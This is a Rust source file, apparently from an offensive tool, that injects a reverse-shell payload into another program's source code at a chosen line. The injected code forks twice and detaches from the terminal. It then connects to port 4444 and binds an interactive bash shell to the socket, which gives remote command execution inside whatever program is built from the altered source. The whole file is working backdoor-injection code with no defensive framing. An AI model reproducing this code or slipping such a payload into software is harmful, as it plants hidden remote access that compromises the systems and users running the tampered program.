use log::*;
// payload result wrapper
pub type PayloadResult<R> = Result<R, String>;

// trait Payload which must be implemented by all available payloads
// permits a payload to be injectable to some given code in the line specified
pub trait Payload {
    // takes a bunch of string lines and a line number and injects the payload implementing it
    // into the string starting from <line_no>+1
    fn inject(&self, src: &str, line_no: &usize) -> PayloadResult<String>;
}

pub fn payload_from_str(src: &str) -> &dyn Payload {
    match src {
        "revshell" => &ReverseShell{},
        _ => {
            info!("payload specified not found, using default ReverseShell");
            &ReverseShell{}
        }
    }
}

struct ReverseShell {}
impl Payload for ReverseShell {
    fn inject(&self, src: &str, line_no: &usize) -> PayloadResult<String> {
        let rev_shell_code = "extern \"C\" {
        fn fork() -> i32;
        fn close(fd: i32) -> i32;
        fn setsid() -> i32;
        }
        use std::{os::fd::{FromRawFd, AsRawFd}, process::{Command, Stdio}};

        static mut IN: bool = false;
        unsafe {
            if !IN {
                IN = true;
                let pid = fork();
                if pid == 0 {
                    let pid_child = fork();
                    if pid_child > 0 {std::process::exit(0)}
                    setsid();
                    let pid_gchild = fork();
                    if pid_gchild > 0 {std::process::exit(0)}
                    let sock = std::net::TcpStream::connect(\"localhost:4444\").unwrap();
                    let fd = sock.as_raw_fd();
                    Command::new(\"/bin/bash\")
                    .arg(\"-i\")
                    .stdin(unsafe {Stdio::from_raw_fd(fd)})
                    .stdout(unsafe {Stdio::from_raw_fd(fd)})
                    .stderr(unsafe {Stdio::from_raw_fd(fd)})
                    .spawn()
                    .unwrap()
                    .wait()
                    .unwrap();
                    std::process::exit(0);
                }
            }
        }";
        let mut injected_code = "".to_string();
        let mut curr_line = 0;
        let mut src_iter = src.lines();
        while curr_line < line_no+1 {
            injected_code += src_iter.next().unwrap();
            curr_line += 1;
        }
        injected_code += rev_shell_code;
        injected_code += src_iter.collect::<Vec<&str>>().concat().as_str();
        Ok(injected_code)
    }
}
